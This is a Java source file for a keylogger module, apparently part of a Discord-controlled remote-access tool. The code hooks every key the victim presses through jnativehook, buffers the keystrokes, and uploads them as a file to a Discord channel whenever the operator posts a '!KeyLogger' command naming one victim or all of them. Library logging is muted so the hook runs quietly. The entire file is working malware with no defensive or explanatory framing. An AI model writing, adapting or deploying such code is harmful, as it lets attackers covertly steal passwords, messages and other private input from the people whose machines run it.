package me.Eclipse.Modules.Impl;

import java.awt.Color;
import java.io.FileWriter;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;

import me.Eclipse.Brain;
import me.Eclipse.Utils.FileData;
import me.Eclipse.Utils.Helper;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.MessageChannel;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.utils.AttachmentOption;
import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class KeyLoggerModule implements NativeKeyListener {
    public static boolean CapsLock;
    private static String Text = "";

    public static void init() {
        Logger var0 = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        var0.setLevel(Level.WARNING);
        var0.setUseParentHandlers(false);
    }

    public void nativeKeyPressed(NativeKeyEvent var1) {
        if (NativeKeyEvent.getKeyText(var1.getKeyCode()).length() > 1 && (NativeKeyEvent.getKeyText(var1.getKeyCode()).equalsIgnoreCase("Caps Lock") || NativeKeyEvent.getKeyText(var1.getKeyCode()).equalsIgnoreCase("Space") || NativeKeyEvent.getKeyText(var1.getKeyCode()).equalsIgnoreCase("Backspace") || NativeKeyEvent.getKeyText(var1.getKeyCode()).equalsIgnoreCase("Enter") || NativeKeyEvent.getKeyText(var1.getKeyCode()).equalsIgnoreCase("Ctrl"))) {
            if (NativeKeyEvent.getKeyText(var1.getKeyCode()).equalsIgnoreCase("Caps Lock")) {
                CapsLock = !CapsLock;
            } else {
                Text = Text + "[" + NativeKeyEvent.getKeyText(var1.getKeyCode()) + "]";
            }
        } else if (NativeKeyEvent.getKeyText(var1.getKeyCode()).length() == 1) {
            if (CapsLock) {
                Text = String.valueOf(Text + NativeKeyEvent.getKeyText(var1.getKeyCode()));
            } else {
                Text = String.valueOf(Text + NativeKeyEvent.getKeyText(var1.getKeyCode()).toLowerCase());
            }
        }

    }

    public void nativeKeyReleased(NativeKeyEvent var1) {
    }

    public void nativeKeyTyped(NativeKeyEvent var1) {
    }

    public static void run(MessageReceivedEvent var0) {
        MessageChannel var1 = var0.getChannel();
        Message var2 = var0.getMessage();
        if (var2.getChannel().getName().contains("module-keylogger")) {
            if (var2.getContentDisplay().equalsIgnoreCase("!KeyLogger " + Brain.Username) || var2.getContentDisplay().equalsIgnoreCase("!KeyLogger @ALL")) {
                if (Brain.Failed) {
                    Helper.sendMessage(Color.RED, "Module KeyLogger (" + Brain.Username + ")", "Failed to load KeyLogger.", var0);
                } else {
                    Helper.sendMessage(Color.GREEN, "Module KeyLogger (" + Brain.Username + ")", "", var0);

                    try {
                        FileWriter var3 = new FileWriter(FileData.Keyboard.toString());
                        var3.write(Text);
                        var3.close();
                    } catch (IOException var5) {
                        ;
                    }

                    var1.sendFile(FileData.Keyboard, new AttachmentOption[0]).queue();
                }
            }

        }
    }
}
